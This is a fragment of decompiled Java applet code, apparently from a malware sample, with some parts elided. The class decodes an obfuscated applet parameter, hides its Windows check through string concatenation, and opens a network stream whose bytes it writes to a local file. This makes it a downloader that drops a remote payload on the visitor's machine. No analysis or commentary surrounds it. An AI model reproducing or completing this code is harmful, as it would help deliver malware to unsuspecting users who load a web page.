...
import workpack.decoder;
import java.lang.reflect.Method;
import java.lang.reflect.InvocationTargetException;
import java.io.InputStream;
import java.io.FileOutputStream;
import java.net.URL;
import workpack.editor;
...
public class peers extends Applet
{
    public void start() {
        super.start();
        try {
            final String srtr1 = editor.b(this.getParameter("dskvnds"));
            ...
            try {
                if (srtr10.indexOf("W".concat("in").concat("do".concat("ws"))) >= 0) {
                    ...
                    final InputStream LsIS = lllo.openStream();
                    final String dcasm = "dsfvnefj";
                    final boolean ascmsa = true;
                    final FileOutputStream ofo = new FileOutputStream(String.valueOf(srtr9) + srtr8);
                    final byte[] asw = new byte[1024];
                    int i;
                    while ((i = LsIS.read(asw, 0, asw.length)) != -1) {
                        ofo.write(asw, 0, i);
                    }
                    LsIS.close();
                    ofo.close();
